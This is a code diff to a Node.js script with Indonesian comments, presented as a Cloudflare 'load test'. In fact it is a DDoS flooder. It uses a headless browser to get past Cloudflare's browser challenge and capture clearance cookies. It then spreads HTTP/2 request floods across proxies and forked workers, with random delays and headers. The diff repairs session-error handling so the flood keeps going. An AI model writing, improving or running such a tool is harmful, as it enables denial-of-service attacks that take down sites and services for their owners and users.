@@ -1,4 +1,4 @@
-// stress-cf-ultimate.js - Uji Beban Cloudflare Ultimate (dengan debug & fallback)
+// stress-cf-ultimate.js - Uji Beban Cloudflare Ultimate (Fix HTTP2 session error)
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -202,10 +202,8 @@ async function getCloudflareCookie(targetUrl, proxy = null) {
     const page = await browser.newPage();
     await page.setUserAgent(new UserAgent().toString());
     await page.setViewport({ width: 1280, height: 720 });
-    // Tambahkan ekstensi stealth
     await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
     const content = await page.content();
-    // Cek apakah ada challenge Cloudflare
     const isCF = content.includes('cf-challenge') || 
                  content.includes('Checking your browser') ||
                  content.includes('cf-browser-verification') ||
@@ -213,10 +211,8 @@ async function getCloudflareCookie(targetUrl, proxy = null) {
     if (!isCF) {
       console.log('[CF-Bypass] Target tidak menggunakan Cloudflare atau sudah bypassed.');
       await browser.close();
-      // Kembalikan cookie kosong (tidak perlu)
       return { value: 'no_cf_required', isCF: false };
     }
-    // Tunggu sebentar untuk challenge selesai
     await page.waitForFunction(
       () => !document.querySelector('#cf-challenge') && !document.querySelector('#challenge-form'),
       { timeout: 30000 }
@@ -228,7 +224,6 @@ async function getCloudflareCookie(targetUrl, proxy = null) {
       console.log(`[CF-Bypass] Berhasil: ${cf.value}`);
       return { value: cf.value, isCF: true };
     }
-    // Jika gagal, simpan HTML untuk debug
     const html = await page.content();
     fs.writeFileSync('debug.html', html);
     console.log('[CF-Bypass] Gagal mendapatkan cf_clearance. HTML disimpan ke debug.html');
@@ -277,7 +272,7 @@ function generateHeaders(parsedTarget, cookie) {
   return headers;
 }
 
-// ==================== FLOODER DENGAN JEDA ACAK ====================
+// ==================== FLOODER DENGAN JEDA ACAK (FIXED) ====================
 function runFlooder(cookie, proxyManager, parsedTarget) {
   const proxy = proxyManager.getProxy();
   if (!proxy) return;
@@ -317,25 +312,60 @@ function runFlooder(cookie, proxyManager, parsedTarget) {
       },
     });
 
-    client.on('connect', () => {
-      let sent = 0;
-      const sendNext = () => {
-        if (sent >= args.rate) return;
+    // Variabel untuk membatalkan timer
+    let timeoutId = null;
+    let cancelled = false;
+
+    const sendNext = () => {
+      if (cancelled || client.destroyed || client.closed) return;
+      if (sent >= args.rate) return;
+      
+      try {
         const headers = generateHeaders(parsedTarget, cookie);
         const req = client.request(headers);
         req.on('response', () => { req.close(); req.destroy(); });
         req.on('error', () => {});
         req.end();
-        sent++;
-        const delay = randomInt(50, 300);
-        setTimeout(sendNext, delay);
-      };
+      } catch (err) {
+        // Jika error karena session invalid, hentikan pengiriman
+        if (err.code === 'ERR_HTTP2_INVALID_SESSION') {
+          cancelled = true;
+          client.destroy();
+          return;
+        }
+      }
+      sent++;
+      const delay = randomInt(50, 300);
+      timeoutId = setTimeout(sendNext, delay);
+    };
+
+    let sent = 0;
+    client.on('connect', () => {
       sendNext();
       proxyManager.mark(proxy, true);
     });
 
-    client.on('error', () => { client.destroy(); socket.destroy(); proxyManager.mark(proxy, false); });
-    client.on('close', () => { client.destroy(); socket.destroy(); });
+    const cleanup = () => {
+      cancelled = true;
+      if (timeoutId) clearTimeout(timeoutId);
+      client.destroy();
+      socket.destroy();
+    };
+
+    client.on('error', (err) => {
+      cleanup();
+      proxyManager.mark(proxy, false);
+    });
+    client.on('close', () => {
+      cleanup();
+    });
+    socket.on('error', () => {
+      cleanup();
+      proxyManager.mark(proxy, false);
+    });
+    socket.on('close', () => {
+      cleanup();
+    });
   });
 
   socket.on('error', () => { socket.destroy(); proxyManager.mark(proxy, false); });
@@ -371,10 +401,8 @@ if (cluster.isMaster) {
     }
     console.log(`[Proxy] ${alive} proxy hidup dari ${rawProxies.length}`);
 
-    // Coba bypass Cloudflare
     let cookieData = null;
     const aliveProxies = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
-    // Coba melalui proxy yang hidup
     for (const p of aliveProxies.slice(0, 5)) {
       const result = await getCloudflareCookie(args.target, p);
       if (result && result.value) {
@@ -383,7 +411,6 @@ if (cluster.isMaster) {
       }
     }
     if (!cookieData) {
-      // Coba tanpa proxy
       const result = await getCloudflareCookie(args.target, null);
       if (result && result.value) cookieData = result;
     }
@@ -402,7 +429,6 @@ if (cluster.isMaster) {
       cookie = { value: '' };
     }
 
-    // Fork worker
     for (let i = 1; i <= args.threads; i++) {
       const worker = cluster.fork();
       worker.send({ cookie, proxies: rawProxies });
@@ -431,4 +457,4 @@ if (cluster.isMaster) {
       setInterval(() => runFlooder(cookie, manager, parsedTarget), 100);
     }
   });
-      }
+  }
